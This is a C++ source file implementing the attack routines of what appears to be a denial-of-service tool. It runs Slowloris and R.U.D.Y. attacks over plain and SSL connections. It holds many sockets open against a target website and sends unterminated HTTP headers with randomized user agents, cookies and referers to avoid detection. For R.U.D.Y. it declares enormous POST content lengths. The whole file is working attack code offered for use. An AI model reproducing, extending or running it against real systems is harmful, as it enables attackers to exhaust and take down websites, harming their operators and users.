#include <netdb.h>
#include <openssl/ssl.h>

#include "../Headers/Slowloris.hpp"

void Slowloris::attack() {
    std::vector<int> sockets;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
    }
    while(true) {
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            httphdr header{};
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                init_header(&header);
            }

            if((write_socket(sockets[x], header.get(), static_cast<int>(header.length()))) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                init_header(&header);
            }else{
                Randomizer::randomstr((std::string&)*(&header));
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                (*conf->req)++;
            }
        }
        (*conf->voly)++;
        pause();
    }
}

void Slowloris::attack_ssl() {
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.emplace_back(0);
        SSLs.emplace_back(nullptr);
        CTXs.emplace_back(nullptr);
    }
    while(true) {
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            httphdr header{};
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                init_header(&header);
            }

            if((write_socket(SSLs[x], header.get(), static_cast<int>(header.length()))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                init_header(&header);
            }else{
                Randomizer::randomstr((std::string&)*(&header));
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                (*conf->req)++;
            }
        }
        (*conf->voly)++;
        pause();
    }
}

Slowloris::Slowloris(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf)) {

}

void Slowloris::init_header(httphdr *header) {

    switch (conf->vector){
        case Config::Slowloris:
            Randomizer::random_method(header->method);
            break;
        case Config::Rudy:
            header->method = "POST";
            header->content_length = Randomizer::randomInt(100000000, 1000000000);
            break;
        default:break;
    }
    if(conf->RandomizeHeader){
         Randomizer::randomstr(header->path);
    }
    Randomizer::random_useragent(*(conf->useragents), header->useragent);
    Randomizer::random_caching(header->cache_control);
    Randomizer::random_encoding(header->encoding);
    Randomizer::random_charset(header->charset[0]);
    Randomizer::random_charset(header->charset[1]);
    Randomizer::random_referer(header->referer);
    header->accept = "*/*";
    header->connection_type = "Keep-Alive";
    Randomizer::random_contenttype(header->content_type);
    Randomizer::randomstr(header->cookie[0]);
    Randomizer::randomstr(header->cookie[1]);
    header->keep_alive = Randomizer::randomInt(1, 5000);
    header->DNT = Randomizer::randomInt(0, 1);

    header->generate_unterminated();

}

